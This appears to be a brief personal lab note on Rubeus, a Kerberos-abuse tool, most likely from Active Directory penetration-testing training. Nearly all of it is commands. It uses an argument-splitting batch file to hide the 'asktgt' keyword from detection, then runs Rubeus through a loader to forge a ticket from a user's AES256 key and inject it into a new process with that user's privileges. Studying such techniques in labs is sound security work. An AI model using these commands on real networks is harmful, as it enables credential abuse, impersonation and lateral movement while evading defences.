command-line tool developed to **misuse and manipulate Kerberos authentication**. basically used to forge tickets.

from local system using elevated shell, run 
```
C:\AD\Tools\ArgSplit.bat
```
```
asktgt
```
copy paste output and then:
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:<user> /aes256:<aes_hmac> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
new process starts with <user> privilege
